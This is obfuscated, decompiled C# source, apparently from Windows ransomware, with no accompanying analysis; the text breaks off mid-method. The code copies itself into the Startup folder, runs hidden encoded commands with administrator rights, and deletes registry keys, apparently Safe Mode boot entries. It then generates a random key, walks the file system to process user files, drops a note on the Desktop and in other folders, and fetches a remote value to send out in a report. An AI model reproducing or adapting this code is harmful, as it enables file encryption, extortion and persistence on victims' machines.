
	public static string TwVGaILieUVRn;

	public static string ECUEIqzZOk;

	public static string bNoLNbcKQsXj;

	public static string deCuUcznmqYI;

	public static string iunmsWwxJij;

	public static string FxhLAZMgieEXYdo;

	public static string LhiuvUHhkI;

	public static string[] geAadizFUr;

	public static string YCyjCQiwEiQ;

	public static bool mvEARGpSInJD;

	public static string StVsmnoWHmXuLw;

	public static bool nXPdGXfAViu;

	public static bool fRkJrERnVT;

	public static bool TIvVZDojNzsxO;

	public static bool baEcrAPcrRB;

	public static string NarcQCMbbNaqtU;

	public static bool ySPgVCqYcWT;

	public static bool MilMuMTovZx;

	public static bool acOyjecWJrE;

	public static bool wdtSggURCxcnGd;

	public static bool krgzddxGYNU;

	public static string oztksqPDRCM;

	public static bool qPogNmZXCL;

	public static Stopwatch xyLxSGfFZpX;

	public static int aZPMuiXAvDSZE;

	public static int ePwuTuiAXFH;

	public static bool DiqbXqqefPkiW;

	public static string NHtXqRcSpHaMt;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegated;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate13;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate14;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate15;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate16;

	[NonSerialized]
	internal static GetString getString_0;

	private static void Main(string[] args)
	{
		if (args.Length == 0 && CQdUFfqZbG == getString_0(107396840))
		{
			try
			{
				gIrIlbMFNlsyg CS_0024_003C_003E8__locals0 = new gIrIlbMFNlsyg();
				CS_0024_003C_003E8__locals0.lrOkHNFNlhOe = Process.GetCurrentProcess().ProcessName;
				if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.lrOkHNFNlhOe) > 1)
				{
					return;
				}
			}
			catch (Exception)
			{
			}
		}
		if (args.Length == 0 && CQdUFfqZbG == getString_0(107396840))
		{
			try
			{
				gUSJqnIekqk.VsfCrimVAxMZ(mgPKyvtQeNO);
			}
			catch (Exception)
			{
			}
		}
		try
		{
			if (deCuUcznmqYI == getString_0(107396835))
			{
				Thread thread = new Thread(CYkQtzYsyrOeXk.SVbXZNsJGQwh);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (FbrxAxGStlnzYU == getString_0(107396835))
		{
			Thread.Sleep(int.Parse(JTRTIuEOTvuh));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && RFlzVSEmhVRu == getString_0(107396835))
		{
			try
			{
				MdVFXvgIXtLoe(iWzroveCagNOUOgR(getString_0(107396830)));
			}
			catch
			{
			}
		}
		try
		{
			if (xbWzJPCNNlGDGm == getString_0(107396835) && SJRKkuQUPhWbAuM.lNdDomvlIZczyWM())
			{
				new xBghGCMDwDv().nWQZHYlPeRW(bool_0: false);
				SJRKkuQUPhWbAuM.MMsUQaruBeR();
			}
		}
		catch (Exception)
		{
		}
		if (horNorVByMaUksf == getString_0(107396835) && SJRKkuQUPhWbAuM.lNdDomvlIZczyWM())
		{
			new xBghGCMDwDv().nWQZHYlPeRW(bool_0: false);
			new xBghGCMDwDv().DXcWZJytpBYp();
		}
		if (tkOWDxFxUWicNm == getString_0(107396835))
		{
			cLwQhOHJuPfZth.kqPhFVAgBjSl();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107397205);
			string text2 = text + Path.GetFileName(fileName);
			if (cMOYTgWgGzGu == getString_0(107396835) && fileName != text2)
			{
				Thread thread2 = new Thread(ZqiVuRLuPdlES);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (imBstcBDQISzV == getString_0(107396835) && mainModule != null && fileName != text2)
			{
				try
				{
					HttjUNgZVMdF = HQyaXMylEdQNMR(0, BlKPvBRBvxfSTW.Count);
					File.Copy(fileName, text + BlKPvBRBvxfSTW[HttjUNgZVMdF], overwrite: true);
					Process.Start(text + BlKPvBRBvxfSTW[HttjUNgZVMdF]);
					TwRlPooOVgtl();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (nFxEalhYYCjpL == getString_0(107396835) && DateTime.Now < fgPtuXEkZLaHJD)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (CZjeZpoOaBnWY == getString_0(107396835) && DateTime.Now > YAumgqZlOtmhY)
			{
				TwRlPooOVgtl();
			}
		}
		catch
		{
		}
		jJUeWMaSDO();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegated == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegated = delegate
			{
				List<string> iHpJZCadsoQtVF = IHpJZCadsoQtVF;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
					{
						zbzRUHIEDzWaHHIW(getString_0(107392212), string_0);
					};
				}
				Parallel.ForEach(iHpJZCadsoQtVF, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
				List<string> xXTcJnsSin = XXTcJnsSin;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
					{
						zbzRUHIEDzWaHHIW(getString_0(107392235), string_0);
					};
				}
				Parallel.ForEach(xXTcJnsSin, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				List<string> euyTUVwaghbjWq = EuyTUVwaghbjWq;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
					{
						zbzRUHIEDzWaHHIW(iWzroveCagNOUOgR(getString_0(107392222)), string_0);
					};
				}
				Parallel.ForEach(euyTUVwaghbjWq, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
				if (LhiuvUHhkI == getString_0(107396835))
				{
					string[] source = geAadizFUr;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
						{
							zbzRUHIEDzWaHHIW(iWzroveCagNOUOgR(getString_0(107392222)), getString_0(107392197) + string_0 + getString_0(107392188));
						};
					}
					Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
				}
				if (!sTsovardsxZr().Contains(getString_0(107392909)))
				{
					OwJdeQnBeVULEVel(abdHCeUGVK);
				}
				else
				{
					List<string> yxhEsnxKVPVIG = YxhEsnxKVPVIG;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
						{
							zbzRUHIEDzWaHHIW(iWzroveCagNOUOgR(bnFgySFPvGNkn(getString_0(107392151))), string_0);
						};
					}
					Parallel.ForEach(yxhEsnxKVPVIG, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
				}
				List<string> source2 = mTjzKFABFlRPD;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
					{
						zbzRUHIEDzWaHHIW(iWzroveCagNOUOgR(getString_0(107392158)), string_0);
					};
				}
				Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
				List<string> source3 = iSBgDeZeUJkg;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
					{
						zbzRUHIEDzWaHHIW(getString_0(107392109), string_0);
					};
				}
				Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegated);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && TIvVZDojNzsxO)
			{
				try
				{
					Thread thread4 = new Thread(XqLcUEhPipWd.yKOTwBxYlSaOKU);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			zbzRUHIEDzWaHHIW(getString_0(107397200), iWzroveCagNOUOgR(getString_0(107397219)));
			zbzRUHIEDzWaHHIW(getString_0(107397200), iWzroveCagNOUOgR(getString_0(107397114)));
			zbzRUHIEDzWaHHIW(iWzroveCagNOUOgR(getString_0(107397089)), iWzroveCagNOUOgR(getString_0(107397044)));
			zbzRUHIEDzWaHHIW(iWzroveCagNOUOgR(getString_0(107397089)), iWzroveCagNOUOgR(getString_0(107396402)));
		}
		SecureString secureString = new SecureString();
		if (CnIdBEsRRFvc == getString_0(107396840))
		{
			Random random = new Random();
			for (int i = 0; i < 32; i++)
			{
				char value = (char)(random.Next(33, 127) % 255);
				if (Convert.ToInt32(value) != 34 && Convert.ToInt32(value) != 92)
				{
					secureString.AppendChar(Convert.ToChar(value));
				}
				else
				{
					i--;
				}
			}
		}
		else
		{
			xlYLjVrSvCTxIOZJ = getString_0(107396292);
		}
		sSCSYzLRGQ = BAWbbIGcEbbh.BsLVCxQmQh(ceuHzUmUyXwZd(secureString));
		if (acOyjecWJrE)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), oztksqPDRCM)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), oztksqPDRCM), string.Concat(iWzroveCagNOUOgR(getString_0(107396215)), new WebClient().DownloadString(iWzroveCagNOUOgR(getString_0(107396222))), getString_0(107396661), iWzroveCagNOUOgR(getString_0(107396656)), DateTime.Now, getString_0(107396661), iWzroveCagNOUOgR(getString_0(107396647)), sSCSYzLRGQ));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), oztksqPDRCM), getString_0(107396558) + sSCSYzLRGQ);
				}
			}
			catch (Exception ex7)
			{
				if (ySPgVCqYcWT)
				{
					try
					{
						File.AppendAllText(NarcQCMbbNaqtU, getString_0(107396529) + ex7.Message + getString_0(107396661));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		UnkTbYjltx.QkuPpAlXYUor(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), BreVYNEaqInZ), xoVGYEFeKWSIXC(sSCSYzLRGQ), null, null, getString_0(107396512), getString_0(107396463), null);
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			BNeXBaAUEcD();
		}
		try
		{
			PAIjnLkbYxBCcI(new string[1] { getString_0(107396478) }, new string[100]
			{
				getString_0(107395925),
				getString_0(107395920),
				getString_0(107395947),
				getString_0(107395938),
				getString_0(107395933),
				getString_0(107395896),
				getString_0(107395891),
				getString_0(107395886),
				getString_0(107395913),
				getString_0(107395908),
				getString_0(107395903),
				getString_0(107395866),
				getString_0(107395857),
				getString_0(107395852),
				getString_0(107395875),
				getString_0(107395870),
				getString_0(107395833),
				getString_0(107395828),
				getString_0(107395823),
				getString_0(107395850),
				getString_0(107395841),
				getString_0(107395836),
				getString_0(107395799),
				getString_0(107395794),
				getString_0(107395789),
				getString_0(107395816),
				getString_0(107395811),
				getString_0(107395806),
				getString_0(107395769),
				getString_0(107395764),
				getString_0(107395759),
				getString_0(107395786),
				getString_0(107395781),
				getString_0(107395776),
				getString_0(107395735),
				getString_0(107395730),
				getString_0(107395725),
				getString_0(107395752),
				getString_0(107395891),
				getString_0(107395747),
				getString_0(107395913),
				getString_0(107395706),
				getString_0(107395701),
				getString_0(107395696),
				getString_0(107395723),
				getString_0(107395718),
				getString_0(107395713),
				getString_0(107395708),
				getString_0(107396183),
				getString_0(107396178),
				getString_0(107396173),
				getString_0(107396200),
				getString_0(107396195),
				getString_0(107396190),
				getString_0(107396153),
				getString_0(107396148),
				getString_0(107396143),
				getString_0(107396170),
				getString_0(107396161),
				getString_0(107396156),
				getString_0(107396115),
				getString_0(107396134),
				getString_0(107395747),
				getString_0(107396089),
				getString_0(107396080),
				getString_0(107396103),
				getString_0(107396094),
				getString_0(107396053),
				getString_0(107396044),
				getString_0(107396071),
				getString_0(107396062),
				getString_0(107396021),
				getString_0(107396012),
				getString_0(107396039),
				getString_0(107396034),
				getString_0(107396029),
				getString_0(107395992),
				getString_0(107395987),
				getString_0(107395982),
				getString_0(107396005),
				getString_0(107396000),
				getString_0(107395963),
				getString_0(107395958),
				getString_0(107395953),
				getString_0(107395948),
				getString_0(107395971),
				getString_0(107395418),
				getString_0(107395413),
				getString_0(107395781),
				getString_0(107395408),
				getString_0(107395435),
				getString_0(107395430),
				getString_0(107395425),
				getString_0(107395420),
				getString_0(107395379),
				getString_0(107395374),
				getString_0(107395401),
				getString_0(107395392),
				getString_0(107395355),
				getString_0(107395350)
			}, new string[0], ceuHzUmUyXwZd(secureString), getString_0(107395345));
		}
		catch (Exception ex9)
		{
			if (ySPgVCqYcWT)
			{
				try
				{
					File.AppendAllText(NarcQCMbbNaqtU, getString_0(107395364) + ex9.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395339)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395339));
				streamWriter.WriteLine(iWzroveCagNOUOgR(getString_0(107395306)));
				streamWriter.WriteLine(getString_0(107396661));
				streamWriter.WriteLine(iWzroveCagNOUOgR(getString_0(107395656)));
				streamWriter.WriteLine(sSCSYzLRGQ);
				if (wqnSIjxqtFtHR == getString_0(107396840))
				{
					streamWriter.WriteLine(getString_0(107396661));
					streamWriter.WriteLine(iWzroveCagNOUOgR(getString_0(107395623)) + Convert.ToString(wxtQncBrNHcAfj.Count));
				}
				if (DiqbXqqefPkiW)
				{
					streamWriter.WriteLine(getString_0(107396661));
					streamWriter.WriteLine(iWzroveCagNOUOgR(getString_0(107395514)));
					streamWriter.WriteLine(vYNZTwVhFOANy.kIGHOBEUhMtWMkFKG());
				}
			}
			else
			{
				string text3 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395339));
				if (!text3.Contains(sSCSYzLRGQ) && !nXPdGXfAViu)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395339), getString_0(107395481) + sSCSYzLRGQ);
				}
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in MembHkBRQEG)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107395339)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395339), item + getString_0(107395339), overwrite: true);
				}
				else
				{
					string text4 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395339));
					if (!text4.Contains(sSCSYzLRGQ) && !nXPdGXfAViu)
					{
						File.AppendAllText(item + getString_0(107395339), getString_0(107395481) + sSCSYzLRGQ);
					}
				}
			}
			catch (Exception)
			{
			}
			if (!baEcrAPcrRB && num > 10)
			{
				break;
			}
		}
		if (TwVGaILieUVRn == getString_0(107396835))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395484)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395484));
					streamWriter2.WriteLine(iWzroveCagNOUOgR(getString_0(107394907)));
					streamWriter2.WriteLine(getString_0(107396661));
					streamWriter2.WriteLine(iWzroveCagNOUOgR(getString_0(107394922)));
					streamWriter2.WriteLine(sSCSYzLRGQ + iWzroveCagNOUOgR(getString_0(107394801)));
					if (wqnSIjxqtFtHR == getString_0(107396840))
					{
						streamWriter2.WriteLine(getString_0(107396661));
						streamWriter2.WriteLine(iWzroveCagNOUOgR(getString_0(107394820)) + iWzroveCagNOUOgR(getString_0(107395623)) + Convert.ToString(wxtQncBrNHcAfj.Count) + iWzroveCagNOUOgR(getString_0(107394801)));
					}
					if (DiqbXqqefPkiW)
					{
						streamWriter2.WriteLine(getString_0(107396661));
						streamWriter2.WriteLine(iWzroveCagNOUOgR(getString_0(107395514)));
						streamWriter2.WriteLine(vYNZTwVhFOANy.kIGHOBEUhMtWMkFKG());
					}
				}
				else
				{
					string text5 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395339));
					if (!text5.Contains(sSCSYzLRGQ) && !nXPdGXfAViu)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395484), iWzroveCagNOUOgR(getString_0(107394820)) + getString_0(107395481) + sSCSYzLRGQ + iWzroveCagNOUOgR(getString_0(107394801)));
					}
				}
			}
			catch
			{
			}
		}
		if (ZznCoKAHwMURezBPhT == getString_0(107396835))
		{
			try
			{
				if (wqnSIjxqtFtHR == getString_0(107396840))
				{
					vYNZTwVhFOANy.hHyGBxLiABAHfN(getString_0(107394759), getString_0(107394754), getString_0(107394709), string.Concat(iWzroveCagNOUOgR(getString_0(107396215)), new WebClient().DownloadString(iWzroveCagNOUOgR(getString_0(107396222))), getString_0(107394700), iWzroveCagNOUOgR(getString_0(107396656)), DateTime.Now, getString_0(107396661), iWzroveCagNOUOgR(getString_0(107394727)), Convert.ToString(wxtQncBrNHcAfj.Count), getString_0(107396661), iWzroveCagNOUOgR(getString_0(107396647)), sSCSYzLRGQ));
				}
				else
				{
					vYNZTwVhFOANy.hHyGBxLiABAHfN(getString_0(107394759), getString_0(107394754), getString_0(107394709), string.Concat(iWzroveCagNOUOgR(getString_0(107396215)), new WebClient().DownloadString(iWzroveCagNOUOgR(getString_0(107396222))), getString_0(107394700), iWzroveCagNOUOgR(getString_0(107396656)), DateTime.Now, getString_0(107396661), iWzroveCagNOUOgR(getString_0(107394727)), Convert.ToString(wxtQncBrNHcAfj.Count), getString_0(107396661), iWzroveCagNOUOgR(getString_0(107396647)), sSCSYzLRGQ));
				}
			}
			catch
			{
			}
		}
		if (mqdGbQaLPms == getString_0(107396835))
		{
			try
			{
				qqDOkPtSjYDKEg.jXmqUEhwUWA(new Uri(getString_0(107395158)));
			}
			catch
			{
			}
		}
		if (TwVGaILieUVRn == getString_0(107396840))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395339)))
				{
					Process.Start(iWzroveCagNOUOgR(getString_0(107395157)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395339));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395484)))
				{
					Process.Start(iWzroveCagNOUOgR(getString_0(107395164)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395484));
				}
			}
			catch
			{
			}
		}
		if (!string.IsNullOrEmpty(MSnaZcaVNlKnHeD))
		{
			try
			{
				File.Delete(MSnaZcaVNlKnHeD);
			}
			catch
			{
			}
		}
		if (ySPgVCqYcWT)
		{
			try
			{
				File.AppendAllText(NarcQCMbbNaqtU, getString_0(107395147));
			}
			catch (Exception)
			{
			}
		}
		if (VHsLiUKFfidwWXR == getString_0(107395134))
		{
			TwRlPooOVgtl();
		}
	}

	public static void ZqiVuRLuPdlES()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(iWzroveCagNOUOgR(getString_0(107395093)), iWzroveCagNOUOgR(getString_0(107394939)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int HQyaXMylEdQNMR(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> HrYZRCKDUZYW(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains(getString_0(107394954)) && !text.Contains(getString_0(107394385)) && !text.Contains(getString_0(107394352)) && !text.ToLower().Contains(getString_0(107394367)) && !text.ToLower().Contains(getString_0(107394322)) && !text.Contains(getString_0(107394297)) && !text.Contains(getString_0(107394308)) && !text.ToLower().Contains(getString_0(107394259)) && !text.ToLower().Contains(getString_0(107394278)) && !text.ToLower().Contains(getString_0(107394241)) && !text.ToLower().Contains(getString_0(107394200)) && !text.ToLower().Contains(getString_0(107394215)) && !text.ToLower().Contains(getString_0(107394170)) && !text.ToLower().Contains(getString_0(107394157)) && !text.ToLower().Contains(getString_0(107394648)))
				{
					array = Directory.GetFiles(text);
					goto IL_01f1;
				}
			}
			catch
			{
			}
			continue;
			IL_01f1:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107394655)) && !fileInfo.FullName.Contains(getString_0(107394606)) && !fileInfo.FullName.Contains(getString_0(107394621)) && !fileInfo.FullName.Contains(getString_0(107394572)) && !fileInfo.FullName.Contains(getString_0(107394555)) && !fileInfo.FullName.Contains(getString_0(107394570)) && !fileInfo.FullName.Contains(getString_0(107394521)) && !fileInfo.FullName.Contains(getString_0(107394536)) && !fileInfo.FullName.Contains(getString_0(107394491)) && !fileInfo.FullName.Contains(getString_0(107394502)) && !fileInfo.FullName.ToLower().Contains(getString_0(107394457)) && !fileInfo.FullName.ToLower().Contains(getString_0(107394444)) && !fileInfo.FullName.ToLower().Contains(getString_0(107394427)) && !fileInfo.FullName.ToLower().Contains(getString_0(107394442)) && !fileInfo.FullName.Contains(iWzroveCagNOUOgR(getString_0(107393881))) && !fileInfo.FullName.Contains(getString_0(107393888)) && !fileInfo.FullName.Contains(getString_0(107393843)) && !fileInfo.FullName.Contains(getString_0(107393858)) && !fileInfo.FullName.EndsWith(getString_0(107395345)) && !fileInfo.FullName.EndsWith(getString_0(107393833)) && !fileInfo.FullName.EndsWith(getString_0(107393828)) && !fileInfo.FullName.EndsWith(getString_0(107393823)) && !fileInfo.FullName.EndsWith(getString_0(107393786)) && !fileInfo.FullName.Contains(getString_0(107393781)) && !fileInfo.FullName.Contains(BreVYNEaqInZ) && !fileInfo.FullName.Contains(NarcQCMbbNaqtU) && !fileInfo.FullName.Contains(oztksqPDRCM))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(sdLJpoenlCvgq) * 1024.0 * 1024.0 && wTnoFuArjqi == getString_0(107396835))
						{
							list.Add(fileInfo.FullName);
							NZnuNjUhxbnPUq(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && wTnoFuArjqi == getString_0(107396840))
						{
							list.Add(fileInfo.FullName);
							NZnuNjUhxbnPUq(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static string zbzRUHIEDzWaHHIW(string dlMTklIJxTBn = "", string lxhNnNPdDkE = "")
	{
		string result = getString_0(107395158);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = dlMTklIJxTBn,
				Arguments = lxhNnNPdDkE,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void MdVFXvgIXtLoe(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107393796),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string bnFgySFPvGNkn(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string iWzroveCagNOUOgR(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void OwJdeQnBeVULEVel(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = iWzroveCagNOUOgR(getString_0(107393747));
		processStartInfo.Arguments = getString_0(107393718) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool QFpuXDgdepZeKeP(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static string ceuHzUmUyXwZd(SecureString secureString_0)
	{
		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(secureString_0);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void jJUeWMaSDO()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = bnFgySFPvGNkn(getString_0(107393713));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(iWzroveCagNOUOgR(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(iWzroveCagNOUOgR(getString_0(107394119)));
					registryKey.DeleteSubKey(iWzroveCagNOUOgR(getString_0(107394062)));
					registryKey.DeleteSubKey(iWzroveCagNOUOgR(getString_0(107394077)));
					registryKey.DeleteSubKey(iWzroveCagNOUOgR(getString_0(107394052)));
					registryKey.DeleteSubKey(iWzroveCagNOUOgR(getString_0(107393747)));
					registryKey.DeleteSubKey(iWzroveCagNOUOgR(getString_0(107394027)));
					registryKey.DeleteSubKey(iWzroveCagNOUOgR(getString_0(107393966)));
					registryKey.Close();
				}
				string_ = bnFgySFPvGNkn(getString_0(107393981));
				registryKey = Registry.LocalMachine.OpenSubKey(iWzroveCagNOUOgR(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(iWzroveCagNOUOgR(getString_0(107393372)));
					registryKey.Close();
				}
				string_ = bnFgySFPvGNkn(getString_0(107393355));
				registryKey = Registry.LocalMachine.OpenSubKey(iWzroveCagNOUOgR(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(iWzroveCagNOUOgR(getString_0(107393372)));
					registryKey.Close();
				}
				string_ = bnFgySFPvGNkn(getString_0(107393355));
				registryKey = Registry.CurrentUser.OpenSubKey(iWzroveCagNOUOgR(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(iWzroveCagNOUOgR(getString_0(107393372)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			zbzRUHIEDzWaHHIW(iWzroveCagNOUOgR(getString_0(107393306)), iWzroveCagNOUOgR(getString_0(107393321)));
			zbzRUHIEDzWaHHIW(iWzroveCagNOUOgR(getString_0(107393240)), iWzroveCagNOUOgR(getString_0(107393231)));
			zbzRUHIEDzWaHHIW(iWzroveCagNOUOgR(getString_0(107393240)), iWzroveCagNOUOgR(getString_0(107393629)));
			zbzRUHIEDzWaHHIW(iWzroveCagNOUOgR(getString_0(107393568)), iWzroveCagNOUOgR(getString_0(107393519)));
		}
		catch
		{
		}
	}

	public static void qJuIVZQcNrI(string string_0, byte[] byte_0)
	{
		try
		{
